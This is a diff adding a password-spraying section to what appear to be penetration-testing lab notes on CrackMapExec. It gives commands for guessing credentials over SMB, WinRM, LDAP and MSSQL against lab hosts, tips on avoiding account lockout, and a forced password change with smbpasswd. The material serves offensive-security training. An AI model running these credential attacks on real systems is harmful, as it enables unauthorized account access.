@@ -103,6 +103,145 @@ GROUPMEM... 10.129.204.177  389    DC01             Domain Admins
 GROUPMEM... 10.129.204.177  389    DC01             Domain Users
 ```
 
+# Password Spraying
+
+## User List and a Password(s)
+
+```shell
+$ crackmapexec smb 10.129.203.121 -u users.txt -p Inlanefreight01!
+```
+
+```shell
+$ crackmapexec smb 10.129.203.121 -u noemi david grace carlos -p Inlanefreight01!
+```
+
+```shell
+$ crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p Inlanefreight01! Inlanefreight02!
+```
+
+## Continue on Success
+
+```bash
+$ crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p Inlanefreight01! Inlanefreight02! --continue-on-success
+```
+
+## User List and Password List
+
+```bash
+$ crackmapexec smb 10.129.203.121 -u users.txt -p passwords.txt 
+```
+
+## Disable Bruteforcing
+
+If  we want to test if user/pass pair are still valid, use the option `--no-bruteforce`. This option will use the 1st user with the 1st password, the 2nd user with the 2nd password, and so on.
+
+```bash
+$ crackmapexec smb 10.129.203.121 -u userfound.txt -p passfound.txt --no-bruteforce --continue-on-success
+```
+
+## Testing Local Accounts
+
+If we would like to test a local account we can use the `--local-auth`
+
+```bash
+$ crackmapexec smb 192.168.133.157 -u Administrator -p Password@123 --local-auth
+```
+
+## Account Lockout
+
+Be careful when performing Password Spraying. We need to ensure the value: `Account Lockout Threshold` is set to None. If there is a value (usually 5), be careful with the number of attempts we try on each account and observe the window in which the counter is reset to 0 (typically 30 minutes).
+
+If you already have a user account, you can query its `Bad-Pwd-Count` attribute, which measures the number of times the user tried to log on to the account using an incorrect password.
+
+```bash
+$ crackmapexec smb 10.129.203.121 --users -u grace -p Inlanefreight01!
+```
+
+## Account Status
+
+When we test an account, there are three colors that CME can display:
+
+| **Color** | **Description**                                                                |
+| --------- | ------------------------------------------------------------------------------ |
+| Green     | The username and the password is valid.                                        |
+| Red       | The username or the password is invalid.                                       |
+| Magenta   | The username and password are valid, but the authentication is not successful. |
+Authentication can be unsuccessful while the password is still valid for various reasons. Here is a complete list:
+
+|                               |
+| ----------------------------- |
+| STATUS_ACCOUNT_DISABLED       |
+| STATUS_ACCOUNT_EXPIRED        |
+| STATUS_ACCOUNT_RESTRICTION    |
+| STATUS_INVALID_LOGON_HOURS    |
+| STATUS_INVALID_WORKSTATION    |
+| STATUS_LOGON_TYPE_NOT_GRANTED |
+| STATUS_PASSWORD_EXPIRED       |
+| STATUS_PASSWORD_MUST_CHANGE   |
+| STATUS_ACCESS_DENIED          |
+
+## Changing Password for an Account
+
+```bash
+$ crackmapexec smb 10.129.203.121 -u julio peter -p Inlanefreight01!
+
+SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
+SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\julio:Inlanefreight01! STATUS_LOGON_FAILURE 
+SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\peter:Inlanefreight01! STATUS_PASSWORD_MUST_CHANGE
+```
+
+```bash
+$ smbpasswd -r 10.129.203.121 -U peter
+
+Old SMB password:
+New SMB password:
+Retype new SMB password:
+Password changed for user peter
+```
+
+## WinRM
+
+By default, [Windows Remote Management (WinRM)](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) service, which is essentially designed for remote administration, allows us to execute PowerShell commands on a target. WinRM is enabled by default on Windows Server 2012 R2 / 2016 / 2019 on ports TCP/5985 (HTTP) and TCP/5986 (HTTPS).
+
+```bash
+$ crackmapexec winrm 10.129.203.121 -u userfound.txt -p passfound.txt --no-bruteforce --continue-on-success
+```
+
+## LDAP
+
+When doing Password Spraying against the LDAP protocol, we need to use the `FQDN` otherwise, we will receive an error.
+
+```bash
+$ crackmapexec ldap dc01.inlanefreight.htb -u julio grace -p Inlanefreight01!
+```
+
+## MSSQL
+
+`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in `Windows` or the `SQL Server`.
+
+This means that we can have three types of users to authenticate to `MSSQL`:
+
+1. Active Directory Account.
+2. Local Windows Account.
+3. SQL Account.
+
+```bash
+$ crackmapexec mssql 10.129.203.121 -u julio grace jorge -p Inlanefreight01! -d inlanefreight.htb
+```
+
+For a local Windows Account, we need to specify a dot (.) as the domain option `-d` or the target machine name:
+
+```bash
+$ crackmapexec mssql 10.129.203.121 -u julio grace -p Inlanefreight01! -d .
+```
+
+If we want to try a `SQL Account`, we need to specify the flag `--local-auth`:
+
+```bash
+$ crackmapexec mssql 10.129.203.121 -u julio grace  -p Inlanefreight01! --local-auth
+```
+
+
 # Finding ASREPRoastable Accounts
 
 The `ASREPRoast` attack looks for users without Kerberos pre-authentication required. That means that anyone can send an `AS_REQ` request to the KDC on behalf of any of those users and receive an `AS_REP` message. This last kind of message contains a chunk of data encrypted with the original user key derived from its password. Then, using this message, the user password could be cracked offline if the user chose a relatively weak password.
